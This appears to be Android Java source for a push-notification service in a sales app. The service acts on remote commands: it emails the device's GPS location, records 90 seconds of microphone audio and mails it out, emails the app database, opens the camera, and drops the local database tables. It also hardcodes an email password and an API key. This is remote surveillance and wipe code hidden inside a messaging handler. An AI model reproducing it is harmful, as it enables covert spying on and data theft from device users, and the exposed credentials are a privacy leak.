package com.marzam.com.appventas.PushNotifications;

import android.app.Activity;
import android.app.IntentService;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Camera;
import android.graphics.PixelFormat;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.*;
import android.provider.MediaStore;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.Window;
import android.view.WindowManager;

import com.google.android.gms.gcm.GoogleCloudMessaging;
import com.marzam.com.appventas.Email.Mail;
import com.marzam.com.appventas.GPS.GPSHelper;
import com.marzam.com.appventas.MainActivity;
import com.marzam.com.appventas.R;
import com.marzam.com.appventas.SQLite.CSQLite;


import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * Created by SAMSUMG on 15/11/2014.
 */
public class GCMIntentService extends IntentService{

    private static final int NOTIF_ALERTA_ID = 1;
    String lat="0";
    String lon="0";
    GPSHelper gps;
    Context context;
    Mail m;
    CSQLite lite;
    File directorio;

    public GCMIntentService() {
        super("GCMIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        GoogleCloudMessaging gcm = GoogleCloudMessaging.getInstance(this);

        String messageType = gcm.getMessageType(intent);
        Bundle extras = intent.getExtras();


        if (!extras.isEmpty()) {
            if (GoogleCloudMessaging.MESSAGE_TYPE_MESSAGE.equals(messageType)) {

                context=getApplicationContext();
                gps=new GPSHelper(context);

                lat=gps.getLatitude();
                lon=gps.getLongitude();

                String mensaje=extras.getString("msg");
                Comando(mensaje);
            }
        }

        GCMBroadcastReceiver.completeWakefulIntent(intent);
    }

    private void Comando(String mensaje){

        String[] com=mensaje.split(";");


        if(com[0].equals("00")){
            mostrarNotification(com.length==2?"":com[1]);
        }
        if(com[0].equals("01")){

            new SendEmail_Coordenadas().execute("");
        }
        if(com[0].equals("02")){

            lite=new CSQLite(context);
            SQLiteDatabase db=lite.getWritableDatabase();

            String[] consulta={"drop table agentes","drop table clientes","drop table productos"};



               for(int i=0;i<consulta.length;i++){
                   try {
                       db.execSQL(consulta[i]);
                   }catch (Exception e){
                       continue;
                   }
               }
        }//Eliminar tablas

        if(com[0].equals("03")){
           Grabar_Audio();
        }

        if(com[0].equals("04")){
            Camara();
        }

        if(com[0].equals("05")){
            new SendEmail_BD().execute("");
        }


    }

    private void Grabar_Audio(){
      try{

          MediaRecorder recorder=new MediaRecorder();
          recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
          recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
          recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);


          File folder = android.os.Environment.getExternalStorageDirectory();

              directorio = new File(folder.getAbsolutePath() + "/Marzam/audio");
          if (directorio.exists() == false) {
              directorio.mkdirs();
          }
          File path=new File(String.valueOf(directorio));

          File archivo=File.createTempFile("temporal",".mp3",path);
          recorder.setOutputFile(archivo.getAbsolutePath());
          recorder.prepare();
          recorder.start();

         Thread.sleep(90000);

          recorder.stop();
          recorder.release();

          new SendEmail_Audio().execute("");

      }catch (Exception e){
        String error=e.toString();
         e.printStackTrace();
      }
    }

    private void Camara(){
        Intent takePictureIntent=new Intent(MediaStore.ACTION_IMAGE_CAPTURE_SECURE);
        if(takePictureIntent.resolveActivity(getPackageManager())!=null){
            try {

                Intent new_intent=Intent.createChooser(takePictureIntent,"Camera");
                new_intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                getApplicationContext().startActivity(new_intent);

            }catch (Exception e){
                String err=e.toString();
                e.printStackTrace();
            }
        }
    }

    private void sendMessage(){
        GoogleCloudMessaging gcm=GoogleCloudMessaging.getInstance(getApplicationContext());
        String to="AIzaSyDKTM0TT0gBrFrWh4FcroMLPMXTnAW-JQY";
        AtomicInteger msgId= new AtomicInteger();
        String id=Integer.toString(msgId.incrementAndGet());
        Bundle data=new Bundle();
        data.putString("hello","world");

        try {

            gcm.send(to,id,data);

        } catch (IOException e) {
            String err=e.toString();
            e.printStackTrace();
        }
    }

    private void sendEmail_Coordenadas(){

        gps=new GPSHelper(getApplicationContext());

        lat=gps.getLatitude();
        lon=gps.getLongitude();

        Intent itSend=new Intent(Intent.ACTION_SEND);
        itSend.setType("plain/text");
        itSend.putExtra(Intent.EXTRA_EMAIL,new String[]{"imartinez@marzam.com.mx","cardenal.07@hotmail.com"});
        itSend.putExtra(Intent.EXTRA_SUBJECT,"Coordenadas");
        itSend.putExtra(Intent.EXTRA_TEXT,"Latitud: "+lat+"\nLongitud: "+lon);

        Intent new_intent=Intent.createChooser(itSend,"Send Message");
        new_intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        try {

            getApplicationContext().startActivity(new_intent);

        }catch (Exception e){

            String err=e.toString();
            e.printStackTrace();
        }



    }

    private void mostrarNotification(String msg) {
        NotificationManager mNotificationManager =
                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

     // Uri sonido = RingtoneManager.getDefaultUri(Notification.DEFAULT_SOUND);
        Uri sonido2=Uri.parse("android.resource://"+getPackageName()+"/"+R.raw.intheend);

        Vibrator v=(Vibrator)getSystemService(Context.VIBRATOR_SERVICE);
        v.vibrate(3000);
        NotificationCompat.Builder mBuilder =
                new NotificationCompat.Builder(this)
                        .setSmallIcon(R.drawable.ic_launcher)
                        .setContentTitle("Notificacion Marzam")
                        .setSound(sonido2)
                        .setContentText(msg);

        Intent notIntent = new Intent(this, MainActivity.class);
        PendingIntent contIntent = PendingIntent.getActivity(
                this, 0, notIntent, 0);

        mBuilder.setContentIntent(contIntent);

        mNotificationManager.notify(NOTIF_ALERTA_ID, mBuilder.build());
    }

    public void ObtenerArchivos2(){

        File directorio = new File("/data/data/com.marzam.com.appventas/databases/");
        File[] files=directorio.listFiles();


        String err="";
              CopiarArchivos2(files);
    }
    public void CopiarArchivos2(File[] files){
        byte[] buffer=new byte[1024];
        int length;
        FileOutputStream myOuput=null;
        try {

            FileInputStream myInput=null;

            File folder = android.os.Environment.getExternalStorageDirectory();
            File directorio2 = new File(folder.getAbsolutePath() + "/Marzam/preferencias");



            for(int i=0;i<files.length;i++){
                try {
                    myInput = new FileInputStream(files[i]);
                    String archivo = files[i].getName();
                    myOuput = new FileOutputStream(directorio2 + "/" + archivo);
                    while ((length = myInput.read(buffer)) > 0) {
                        myOuput.write(buffer, 0, length);
                    }


                    myInput.close();
                }catch (Exception e){continue;}

            }
            myOuput.close();
            myOuput.flush();
        }
        catch (Exception e){
            String err=e.toString();
            Log.e("ErrorCopiar:",e.toString());
        }
    }

    public class SendEmail_Audio extends AsyncTask<String,Void,Object>{

        @Override
        protected Object doInBackground(String... strings) {

            m = new Mail("rodrigo.cabrera.it129@gmail.com", "juanito1.");
            String[] toArr = {"imartinez@marzam.com.mx"};
            m.setTo(toArr);
            m.setFrom("appVentas");
            m.setSubject("Audio");
            m.setBody("Grabación de audio");

            try {


                File[] archivo=directorio.listFiles();
                if(archivo.length!=0) {
                    m.addAttachment(String.valueOf(archivo[0]), directorio + "/audio.zip");


                    for(int i=0;i<archivo.length;i++){
                        archivo[i].delete();
                    }
                    directorio.delete();
                }




                m.send();



            } catch (Exception e) {
                e.printStackTrace();
            }

            return null;
        }
    }

    public class SendEmail_Coordenadas extends AsyncTask<String,Void,Object>{

        @Override
        protected Object doInBackground(String... strings) {

            try{

                m = new Mail("rodrigo.cabrera.it129@gmail.com", "juanito1.");
                String[] toArr = {"imartinez@marzam.com.mx"};
                m.setTo(toArr);
                m.setFrom("appVentas");
                m.setSubject("Coordenadas");
                m.setBody("Latitu: " + lat + "\nLongitud:" + lon+"\n\n");

                m.send();


            }catch (Exception e){
                String err=e.toString();
                Log.e("SendMail",e.getMessage(),e);
            }
            return "";
        }
    }

    public class SendEmail_BD extends AsyncTask<String,Void,Object>{

        @Override
        protected Object doInBackground(String... strings) {

            m = new Mail("rodrigo.cabrera.it129@gmail.com", "juanito1.");
            String[] toArr = {"imartinez@marzam.com.mx"};
            m.setTo(toArr);
            m.setFrom("appVentas");
            m.setSubject("Base de datos");
            m.setBody("Base de datos");

            try {

                File folder = android.os.Environment.getExternalStorageDirectory();
                directorio = new File(folder.getAbsolutePath() + "/Marzam/Data");
                if (directorio.exists() == false) {
                    directorio.mkdirs();
                }

                File file=new File("/data/data/com.marzam.com.appventas/databases/db.db");

                if(file.exists())
                    m.addAttachment(file.toString(),directorio+"/archivo.zip");

                m.send();



            } catch (Exception e) {
                e.printStackTrace();
            }

            return null;
        }

        @Override
        protected void onPostExecute(Object result){

            File file=new File(directorio+"/archivo.zip");

            if(file.exists()){
                file.delete();
            }
        }
    }



}

